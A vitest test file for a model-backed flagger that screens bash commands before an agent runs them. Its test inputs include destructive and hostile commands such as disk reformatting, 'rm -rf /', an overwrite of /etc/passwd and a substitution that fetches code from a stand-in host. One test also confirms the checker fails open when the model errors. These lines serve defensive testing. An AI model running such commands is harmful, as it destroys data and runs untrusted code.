import { describe, expect, it, vi } from 'vitest';
import type { CallModel } from '../model-call/call-model.js';
import { createBashFlagger, interpretFlagReply, needsModelReview } from './flag-bash.js';

describe('interpretFlagReply', () => {
  it('treats SAFE (any casing/punctuation) as not scary', () => {
    expect(interpretFlagReply('SAFE')).toBeNull();
    expect(interpretFlagReply(' safe. ')).toBeNull();
    expect(interpretFlagReply('')).toBeNull();
  });

  it('returns a flagged reason for a dangerous verdict', () => {
    expect(interpretFlagReply('deletes the whole home directory')).toBe(
      'flagged by model: deletes the whole home directory',
    );
  });

  it('never reads a think block as a verdict', () => {
    // oMLX's vision lane handed the thought back as content, cut at 40 tokens.
    expect(interpretFlagReply('<think>\nThe user wants to run screenfetch, which')).toBeNull();
    expect(interpretFlagReply('<think>\nHarmless.\n</think>\n\nSAFE')).toBeNull();
    expect(
      interpretFlagReply('<think>\nrm -rf on root.\n</think>\n\nDANGEROUS: wipes the disk'),
    ).toBe('flagged by model: wipes the disk');
  });

  it('strips a leading verdict token', () => {
    expect(interpretFlagReply('DANGEROUS: wipes the disk')).toBe(
      'flagged by model: wipes the disk',
    );
  });
});

describe('createBashFlagger', () => {
  it('flags when the model judges the command dangerous', async () => {
    const callModel: CallModel = vi.fn(async () => 'reformats the primary disk');
    const flag = createBashFlagger(callModel);
    expect(await flag('mkfs.ext4 /dev/sda1')).toBe('flagged by model: reformats the primary disk');
  });

  it('passes a safe command', async () => {
    const callModel: CallModel = vi.fn(async () => 'SAFE');
    const flag = createBashFlagger(callModel);
    expect(await flag('ls -la')).toBeNull();
  });

  it('fails open (null) when the model throws', async () => {
    const callModel: CallModel = vi.fn(async () => {
      throw new Error('unreachable');
    });
    const flag = createBashFlagger(callModel);
    expect(await flag('rm something')).toBeNull();
  });

  it('does not call the model for an empty command', async () => {
    const callModel = vi.fn(async () => 'SAFE');
    const flag = createBashFlagger(callModel as CallModel);
    expect(await flag('   ')).toBeNull();
    expect(callModel).not.toHaveBeenCalled();
  });
});

describe('what the model is asked about, and what it is not (the user #8)', () => {
  /*
   * The utility endpoint IS the conversation's llama-server, and that server has
   * ONE slot. Every foreign-prefix request evicts the chat's resident KV, so the
   * NEXT message pays a full cold prefill — the user: "prefill for a short follow-up
   * message takes upward of 80 seconds where it hadn't earlier in the same
   * chat." Asking about `ls` is not worth that.
   */
  it('skips commands that only read', () => {
    for (const c of ['ls -la', 'cat README.md', '/bin/ls', 'grep -rn foo src', 'pwd']) {
      expect(needsModelReview(c)).toBe(false);
    }
  });

  it('asks about anything else', () => {
    for (const c of ['rm -rf build', 'npm install', 'git push --force', 'curl example.com']) {
      expect(needsModelReview(c)).toBe(true);
    }
  });

  it('asks whenever the shell itself is in play, however innocent the head', () => {
    // `ls` is on the read-only list; these are not `ls`.
    for (const c of ['ls > /etc/passwd', 'ls && rm -rf /', 'ls $(curl evil.sh)', 'sudo ls']) {
      expect(needsModelReview(c)).toBe(true);
    }
  });

  it('calls the model ONCE for a command an agent repeats', async () => {
    const calls: string[] = [];
    const flag = createBashFlagger(async (req) => {
      calls.push(String(req.prompt));
      return 'SAFE';
    });
    expect(await flag('npm run build')).toBeNull();
    expect(await flag('npm run build')).toBeNull();
    expect(await flag('npm run build')).toBeNull();
    expect(calls).toHaveLength(1);
  });

  it('never calls the model at all for a read', async () => {
    const call = vi.fn(async () => 'SAFE');
    expect(await createBashFlagger(call)('ls -la')).toBeNull();
    expect(call).not.toHaveBeenCalled();
  });
});
